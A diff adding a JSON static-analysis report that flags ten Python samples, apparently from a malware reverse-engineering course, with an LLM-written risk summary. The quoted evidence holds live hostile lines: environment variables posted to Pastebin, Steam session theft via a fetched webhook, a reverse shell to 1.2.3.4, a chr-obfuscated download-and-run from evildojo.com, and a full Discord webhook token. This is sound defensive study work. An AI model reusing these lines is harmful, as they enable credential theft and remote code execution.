@@ -1,0 +1,628 @@
+{
+  "target": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src",
+  "files_scanned": 10,
+  "total_signals": 45,
+  "overall_risk": "high",
+  "limitations": [
+    "Static-only analysis.",
+    "This tool does not execute or emulate code."
+  ],
+  "files": [
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/bloat.py",
+      "risk": "clean",
+      "score": 0,
+      "imports": [
+        "sys"
+      ],
+      "urls": [],
+      "decoded": [],
+      "signals": [],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/ghidra_example/jython_getMain.py",
+      "risk": "clean",
+      "score": 0,
+      "imports": [
+        "ghidra"
+      ],
+      "urls": [],
+      "decoded": [],
+      "signals": [],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p0.py",
+      "risk": "medium",
+      "score": 4,
+      "imports": [
+        "multiprocessing",
+        "os",
+        "requests",
+        "time"
+      ],
+      "urls": [
+        "https://pastebin.com/api/api_post.php"
+      ],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 6,
+          "evidence": "with open(\".env\", 'w') as f: f.write(env_vars)"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.post",
+          "reason": "Makes an outbound HTTP POST request.",
+          "line": 7,
+          "evidence": "requests.post(\"https://pastebin.com/api/api_post.php\", data={'content': env_vars})"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p1.py",
+      "risk": "high",
+      "score": 15,
+      "imports": [
+        "ctypes",
+        "logging",
+        "os",
+        "re",
+        "subprocess",
+        "sys",
+        "time",
+        "winreg"
+      ],
+      "urls": [],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "process_launch",
+          "severity": "high",
+          "rule": "subprocess.check_call",
+          "reason": "Launches a child process.",
+          "line": 55,
+          "evidence": "return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.getenv",
+          "reason": "Reads an environment variable.",
+          "line": 70,
+          "evidence": "path = os.getenv('APPDATA')"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.getenv",
+          "reason": "Reads an environment variable.",
+          "line": 76,
+          "evidence": "address = os.getenv('LOCALAPPDATA') + '\\\\Programs\\\\Python\\\\Launcher\\\\py.exe' + ' ' + '-i ' + '\"' + path + '\\\\' + file_name + '\"'"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.getenv",
+          "reason": "Reads an environment variable.",
+          "line": 98,
+          "evidence": "path =  os.getenv('APPDATA') + '\\\\'"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.getenv",
+          "reason": "Reads an environment variable.",
+          "line": 99,
+          "evidence": "hide_path = os.getenv('APPDATA') + '\\\\' + sys.argv[0] #BACK"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 102,
+          "evidence": "with open(hide_path, 'w', encoding='utf-8') as f:"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.getenv",
+          "reason": "Reads an environment variable.",
+          "line": 136,
+          "evidence": "hide_path = os.getenv('APPDATA') + '\\\\' + sys.argv[0]"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p2.py",
+      "risk": "high",
+      "score": 18,
+      "imports": [
+        "cryptography",
+        "ctypes",
+        "datetime",
+        "os",
+        "platform",
+        "random",
+        "requests",
+        "shutil",
+        "ssl",
+        "subprocess",
+        "time",
+        "tkinter"
+      ],
+      "urls": [],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "process_launch",
+          "severity": "high",
+          "rule": "subprocess.call",
+          "reason": "Launches a child process.",
+          "line": 71,
+          "evidence": "subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)"
+        },
+        {
+          "category": "process_launch",
+          "severity": "high",
+          "rule": "os.system",
+          "reason": "Executes a shell command.",
+          "line": 72,
+          "evidence": "os.system('cls' if os.name == 'nt' else 'clear')"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 74,
+          "evidence": "f = open(\"logs/path.txt\", \"w\")"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 88,
+          "evidence": "f = open(\"logs/cnt.txt\", \"w\")"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.post",
+          "reason": "Makes an outbound HTTP POST request.",
+          "line": 98,
+          "evidence": "requests.post(url, data)"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 124,
+          "evidence": "f = open(\"logs/digits.txt\", \"w\")"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 194,
+          "evidence": "with open(filename, \"wb\") as file:"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (w).",
+          "line": 238,
+          "evidence": "f = open(\"logs/digits.txt\", \"w\")"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p3.py",
+      "risk": "low",
+      "score": 3,
+      "imports": [
+        "json",
+        "locale",
+        "platform",
+        "psutil",
+        "socket",
+        "time"
+      ],
+      "urls": [],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "network_access",
+          "severity": "high",
+          "rule": "client.connect",
+          "reason": "Attempts an outbound connection.",
+          "line": 78,
+          "evidence": "client.connect((host, port))"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p4.py",
+      "risk": "medium",
+      "score": 4,
+      "imports": [
+        "os",
+        "pathlib",
+        "requests",
+        "time"
+      ],
+      "urls": [
+        "https://discord.com/api/webhooks/1103377250541391932/rBJX_p_1lmkUoUcA_zmEbJ3qhHbXoocinOtwlAqPji0EgHYo2486vpU0OvjcTAz_T102"
+      ],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.post",
+          "reason": "Makes an outbound HTTP POST request.",
+          "line": 38,
+          "evidence": "response = requests.post(DISCORD_WEBHOOK_URL, json=data, headers=headers)"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.post",
+          "reason": "Makes an outbound HTTP POST request.",
+          "line": 60,
+          "evidence": "response = requests.post(DISCORD_WEBHOOK_URL, files={\"file\": file})"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py",
+      "risk": "high",
+      "score": 16,
+      "imports": [
+        "base64",
+        "os",
+        "requests",
+        "zipfile"
+      ],
+      "urls": [
+        "https://mehmetaliii.pythonanywhere.com/webzuhurt"
+      ],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.get",
+          "reason": "Makes an outbound HTTP GET request.",
+          "line": 4,
+          "evidence": "hook = base64.b64decode(requests.get(\"https://mehmetaliii.pythonanywhere.com/webzuhurt\").text).decode()"
+        },
+        {
+          "category": "obfuscation_or_decode",
+          "severity": "medium",
+          "rule": "base64.b64decode",
+          "reason": "Decodes Base64 content.",
+          "line": 4,
+          "evidence": "hook = base64.b64decode(requests.get(\"https://mehmetaliii.pythonanywhere.com/webzuhurt\").text).decode()"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.environ[]",
+          "reason": "Reads an environment variable via os.environ[...].",
+          "line": 7,
+          "evidence": "if os.path.exists(os.environ[\"PROGRAMFILES(X86)\"]+\"\\\\steam\"):"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.environ[]",
+          "reason": "Reads an environment variable via os.environ[...].",
+          "line": 8,
+          "evidence": "steam_path = os.environ[\"PROGRAMFILES(X86)\"]+\"\\\\steam\""
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.environ[]",
+          "reason": "Reads an environment variable via os.environ[...].",
+          "line": 21,
+          "evidence": "with zipfile.ZipFile(f\"{os.environ['TEMP']}\\steam_session.zip\",'w',zipfile.ZIP_DEFLATED) as zp:"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.environ[]",
+          "reason": "Reads an environment variable via os.environ[...].",
+          "line": 23,
+          "evidence": "file = {\"file\": open(f\"{os.environ['TEMP']}\\steam_session.zip\", \"rb\")}"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "requests.post",
+          "reason": "Makes an outbound HTTP POST request.",
+          "line": 24,
+          "evidence": "r = requests.post(hook, files=file)"
+        },
+        {
+          "category": "environment_access",
+          "severity": "medium",
+          "rule": "os.environ[]",
+          "reason": "Reads an environment variable via os.environ[...].",
+          "line": 26,
+          "evidence": "os.remove(f\"{os.environ['TEMP']}\\steam_session.zip\")"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py",
+      "risk": "high",
+      "score": 34,
+      "imports": [
+        "base64",
+        "ctypes",
+        "multiprocessing",
+        "os",
+        "platform",
+        "requests",
+        "socket",
+        "subprocess",
+        "threading",
+        "time"
+      ],
+      "urls": [
+        "https://1.2.3.4:5678/"
+      ],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 49,
+          "evidence": "with open(file_path, \"wb\") as f:"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "socket.socket",
+          "reason": "Creates a raw socket.",
+          "line": 54,
+          "evidence": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+        },
+        {
+          "category": "network_access",
+          "severity": "high",
+          "rule": "s.connect",
+          "reason": "Attempts an outbound connection.",
+          "line": 55,
+          "evidence": "s.connect((address, int(port)))"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 65,
+          "evidence": "t = threading.Thread(target=func, args=args)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 71,
+          "evidence": "p = multiprocessing.Process(target=func, args=args)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 116,
+          "evidence": "multiprocessing.Process(target=reverse_shell, args=("
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 149,
+          "evidence": "with open(\"/tmp/data.bak\", \"wb\") as f:"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 156,
+          "evidence": "threading.Thread(target=sp.getoutput, args=(\"/tmp/data.bak\",)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 160,
+          "evidence": "multiprocessing.Process(target=sp.getoutput, args=(\"/tmp/data.bak\",)).start()"
+        },
+        {
+          "category": "dynamic_execution",
+          "severity": "high",
+          "rule": "exec",
+          "reason": "Uses exec.",
+          "line": 170,
+          "evidence": "exec(module_content)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 175,
+          "evidence": "threading.Thread(target=exec, args=(module_content,)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 179,
+          "evidence": "multiprocessing.Process(target=exec, args=(module_content,)).start()"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 183,
+          "evidence": "with open(\"/tmp/save_dat01\", \"wb\") as f:"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 198,
+          "evidence": "threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 202,
+          "evidence": "multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 206,
+          "evidence": "with open(\"/tmp/save_dat01\", \"wb\") as f:"
+        }
+      ],
+      "syntax_error": null
+    },
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p7.py",
+      "risk": "low",
+      "score": 3,
+      "imports": [],
+      "urls": [],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "dynamic_execution",
+          "severity": "high",
+          "rule": "exec",
+          "reason": "Uses exec.",
+          "line": 1,
+          "evidence": "exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))"
+        }
+      ],
+      "syntax_error": null
+    }
+  ],
+  "llm": {
+    "model": "gemini-2.5-flash",
+    "verdict": {
+      "summary": "Multiple Python scripts exhibit highly suspicious behaviors including launching child processes, making outbound network connections, writing files, accessing environment variables, and utilizing dynamic execution. Some scripts appear to be staging for further payload delivery or data exfiltration, suggesting potential malware or information stealer activity.",
+      "risk_level": "high",
+      "likely_behaviors": [
+        "Process injection or execution of arbitrary commands (shell commands, child processes)",
+        "Exfiltration of system information or credentials via network requests (Pastebin, Discord webhooks, custom C2)",
+        "Persistence mechanisms (writing files to APPDATA, modifying system settings)",
+        "Obfuscation and dynamic code execution to hide true intent",
+        "Information gathering (environment variables, system details)"
+      ],
+      "top_evidence": [
+        "p6.py uses `exec(module_content)` and creates reverse shells via `s.connect` to `1.2.3.4:5678`.",
+        "p1.py launches child processes via `subprocess.check_call('echo %s |clip')` and accesses `APPDATA`.",
+        "p7.py uses `exec(''.join(chr(x) for x in [...]))` to dynamically execute code, which then performs `os.system` after fetching a URL.",
+        "p5.py decodes Base64 content from a remote URL (`mehmetaliii.pythonanywhere.com/webzuhurt`) and exfiltrates data via `requests.post` after archiving Steam sessions.",
+        "p2.py uses `subprocess.call` and `os.system` for command execution, and makes outbound `requests.post`."
+      ],
+      "limitations": [
+        "Static analysis cannot fully evaluate code behavior that depends on runtime conditions, user interaction, or specific environmental configurations.",
+        "The full content of dynamically executed or remotely fetched code (e.g., from `evildojo.com/stage1payload` or `mehmetaliii.pythonanywhere.com/webzuhurt`) is not analyzed in this static report.",
+        "The true nature of network communications (e.g., encrypted payloads) or the commands executed by child processes might be obscured without dynamic analysis.",
+        "Risk scores are based on predefined rules and may not fully reflect the real-world impact without deeper context or dynamic execution."
+      ]
+    }
+  },
+  "collection": {
+    "directory": "/home/calizo/gensec-calizo-calizo/hw8_review",
+    "copied_count": 8,
+    "copied_files": [
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p0.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/001_p0.py",
+        "risk": "medium",
+        "score": 4
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p1.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/002_p1.py",
+        "risk": "high",
+        "score": 15
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p2.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/003_p2.py",
+        "risk": "high",
+        "score": 18
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p3.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/004_p3.py",
+        "risk": "low",
+        "score": 3
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p4.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/005_p4.py",
+        "risk": "medium",
+        "score": 4
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/006_p5.py",
+        "risk": "high",
+        "score": 16
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/007_p6.py",
+        "risk": "high",
+        "score": 34
+      },
+      {
+        "source": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p7.py",
+        "copied_to": "/home/calizo/gensec-calizo-calizo/hw8_review/008_p7.py",
+        "risk": "low",
+        "score": 3
+      }
+    ]
+  }
+}
